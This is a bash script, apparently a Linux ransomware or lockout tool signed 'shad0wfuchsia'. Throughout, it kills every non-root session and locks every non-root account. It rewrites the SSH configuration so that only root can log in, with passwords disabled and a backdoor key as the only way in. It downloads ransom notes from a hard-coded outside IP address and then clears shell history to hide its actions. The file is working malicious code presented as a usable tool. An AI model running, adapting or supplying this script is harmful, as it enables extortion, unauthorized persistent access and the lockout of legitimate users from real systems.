who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'

echo "Kicked em out!"

cp /etc/passwd /etc/passwd.backup.shad0wfuchsia
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.shad0wfuchsia

echo "User table backed up"

echo "Locking users..."

for USERNAME in `cut -d: -f1 /etc/passwd | grep -v root`
do
  sudo passwd -l $USERNAME
done

echo "All users locked"

# Set authorized keyfile to ONLY backdoor key
sed -i 's/\AuthorizedKeysFile.*/AuthorizedKeysFile \/etc\/ssh\/ssh_host_rsa2048_key.pub/' /etc/ssh/sshd_config
sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Disable password authentication
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config

# Remove any existing allowusers directive, replace with root only
sed -i 's/AllowUsers.*/\#/' /etc/ssh/sshd_config
echo -e ' \n' >>/etc/ssh/sshd_config
echo 'AllowUsers root' >> /etc/ssh/sshd_config

sed -i 's/Banner.*/\#/' /etc/ssh/sshd_config
sed -i 's/#Banner.*/\#/' /etc/ssh/sshd_config
echo 'Banner /etc/fuchsia_banner' >> /etc/ssh/sshd_config

echo "SSH Configuration finished"

rm /etc/motd
wget -O /etc/fuchsia_banner http://67.205.157.179/fus-nocolor.txt
wget -O /etc/nologin http://67.205.157.179/fus.txt

echo "Ransom notes installed"

cat >~/unfuck.sh <<EOL
#!/bin/bash

wget -qO - http://67.205.157.179/paid.txt

echo "Reverting changes..."
mv /etc/passwd.backup.shad0wfuchsia /etc/passwd
mv /etc/ssh/sshd_config.backup.shad0wfuchsia /etc/ssh/sshd_config
rm /etc/nologin
echo "" >/etc/fuchsia_banner

for USERNAME in \`cut -d: -f1 /etc/passwd | grep -v root\`
do
  sudo passwd -u $USERNAME
done

echo -e "System configuration restored.\nBye!"
rm -- "\$0"
EOL

kill -HUP $(pgrep -f `which sshd`)

echo "!!!CHANGE THE ROOT PASSWORD"

history -c
echo "" > ~/.bash_history
